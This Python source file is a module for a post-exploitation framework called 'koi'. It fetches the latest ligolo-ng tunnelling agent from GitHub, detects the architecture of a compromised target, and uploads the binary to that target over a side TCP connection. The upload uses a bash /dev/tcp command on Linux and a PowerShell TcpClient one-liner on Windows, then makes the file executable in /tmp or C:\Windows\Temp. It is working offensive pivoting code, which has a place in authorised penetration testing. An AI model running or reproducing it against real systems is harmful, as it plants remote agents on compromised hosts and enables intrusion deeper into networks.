from __future__ import annotations

import io
import json
import re
import select
import tarfile
import time
import urllib.request
import zipfile

from koi.modules.blueprint import KoiModule
from koi.utils.tcp import spawn_send_server

_GITHUB_API = "https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest"

_ARCH_MAP = {
    "x86_64":  "amd64",
    "aarch64": "arm64",
    "armv7l":  "arm",
    "armv6l":  "arm",
    "i686":    "386",
    "i386":    "386",
    "amd64":   "amd64",
    "arm64":   "arm64",
    "x86":     "386",
}


class LigoloModule(KoiModule):
    name        = "ligolo"
    description = "Fetch the latest ligolo-ng agent and upload it to the target."
    usage       = "ligolo <id> [-o <remote_path>]"
    category    = "Pivoting"
    platform    = ["linux", "windows_ps"]
    arguments   = [
        {
            "flags":   ["-o", "--output"],
            "default": None,
            "help":    "Remote destination path for the agent binary",
        },
    ]

    def _detect_arch(self) -> str:
        """Return the ligolo-ng architecture string for the remote target."""
        if self.session.os_type == "linux":
            raw = self._exec_clean("uname -m")
        else:
            raw = self._win_query("$env:PROCESSOR_ARCHITECTURE")

        raw = raw.strip().lower()
        arch = _ARCH_MAP.get(raw)
        if arch is None:
            raise RuntimeError(f"Unrecognised architecture: {raw!r}")
        return arch

    def _latest_release(self) -> tuple[str, list[dict]]:
        """Return (tag_name, assets) for the latest ligolo-ng release."""
        req = urllib.request.Request(
            _GITHUB_API,
            headers={"User-Agent": "koi/ligolo-module", "Accept": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
        return data["tag_name"], data["assets"]

    def _pick_asset(self, assets: list[dict], os_name: str, arch: str) -> dict:
        """
        Select the agent asset for the given OS + arch.
        Ligolo-ng asset names:  ligolo-ng_agent_<ver>_<os>_<arch>.{zip,tar.gz}
        """
        for asset in assets:
            n = asset["name"].lower()
            if "agent" in n and os_name in n and arch in n:
                return asset
        raise RuntimeError(
            f"No ligolo-ng agent asset found for os={os_name!r} arch={arch!r}.\n"
            f"Available: {[a['name'] for a in assets]}"
        )

    def _fetch_agent(self, asset: dict, os_name: str) -> bytes:
        """Download the asset archive and return the raw agent binary bytes."""
        url  = asset["browser_download_url"]
        name = asset["name"].lower()

        req = urllib.request.Request(url, headers={"User-Agent": "koi/ligolo-module"})
        with urllib.request.urlopen(req, timeout=60) as resp:
            archive_data = resp.read()

        if name.endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(archive_data)) as zf:
                candidates = [
                    n for n in zf.namelist()
                    if re.search(r'agent(\.exe)?$', n, re.IGNORECASE)
                    and "__MACOSX" not in n
                ]
                if not candidates:
                    raise RuntimeError(f"agent binary not found in zip: {zf.namelist()}")
                return zf.read(candidates[0])

        else:
            with tarfile.open(fileobj=io.BytesIO(archive_data), mode="r:gz") as tf:
                candidates = [
                    m for m in tf.getmembers()
                    if re.search(r'agent$', m.name, re.IGNORECASE)
                ]
                if not candidates:
                    raise RuntimeError(f"agent binary not found in tar: {[m.name for m in tf.getmembers()]}")
                f = tf.extractfile(candidates[0])
                if f is None:
                    raise RuntimeError("Could not read agent from archive")
                return f.read()

    def _upload_bytes(self, raw: bytes, dest: str) -> bool:
        """Upload *raw* bytes to *dest* on the target via a side TCP connection."""
        local_ip = self._get_local_ip()
        bar = self.ui.ProgressBar(total=len(raw))
        port, t, errors = spawn_send_server(raw, timeout=60, on_progress=lambda sent: bar.update(sent))

        if self.session.os_type == "linux":
            self.exec(
                f"cat < /dev/tcp/{local_ip}/{port} > {dest}",
                timeout=60,
            )
        else:
            ps_cmd = (
                f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
                f"$_s=$_c.GetStream();"
                f"$_f=[IO.File]::OpenWrite('{dest}');"
                f"$_b=New-Object byte[] 65536;"
                f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
                f"$_f.Close();$_c.Close()"
            )
            if self.session.upgraded:
                self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
                time.sleep(0.3)
                r, _, _ = select.select([self.session.conn], [], [], 1.0)
                if r:
                    self.session.conn.recv(4096)
            else:
                self.sendline(ps_cmd)

        t.join(timeout=60)
        bar.done()
        print()

        if errors:
            return False

        time.sleep(1.0)

        if self.session.os_type == "linux":
            result = self.exec(f"test -f {dest} && echo OK || echo MISS")
            return "OK" in result.stdout
        else:
            check = self._win_query(f"(Test-Path '{dest}').ToString()")
            return check.strip().lower() == "true"

    def run(self) -> None:
        os_type = self.session.os_type

        with self.spinner("Detecting target architecture…"):
            try:
                arch = self._detect_arch()
            except Exception as exc:
                self.err(f"Architecture detection failed: {exc}")
                return

        os_name = "windows" if "windows" in os_type else "linux"
        self.status(f"Target: {os_name}/{arch}")

        with self.spinner("Fetching latest ligolo-ng release info…"):
            try:
                tag, assets = self._latest_release()
            except Exception as exc:
                self.err(f"Could not reach GitHub API: {exc}")
                return

        self.status(f"Latest release: {tag}")

        try:
            asset = self._pick_asset(assets, os_name, arch)
        except RuntimeError as exc:
            self.err(str(exc))
            return

        self.status(f"Asset: {asset['name']}  ({asset['size'] // 1024} KB)")

        with self.spinner("Downloading and extracting agent binary…"):
            try:
                agent_bytes = self._fetch_agent(asset, os_name)
            except Exception as exc:
                self.err(f"Download/extraction failed: {exc}")
                return

        self.status(f"Agent extracted ({len(agent_bytes)} bytes)")

        if self.args.output:
            dest = self.args.output
        elif os_name == "windows":
            dest = f"C:\\Windows\\Temp\\agent.exe"
        else:
            dest = "/tmp/agent"

        self.status(f"Uploading to {dest}…")
        ok = self._upload_bytes(agent_bytes, dest)

        if not ok:
            self.err("Upload failed or file not present on target after transfer.")
            return

        if os_name == "linux":
            self.exec(f"chmod +x {dest}")

        print()
        self.box("ligolo-ng agent deployed", {
            "version":  tag,
            "asset":    asset["name"],
            "arch":     arch,
            "remote":   dest,
            "size":     f"{len(agent_bytes)} bytes  ({len(agent_bytes)/1024:.1f} KB)",
        })
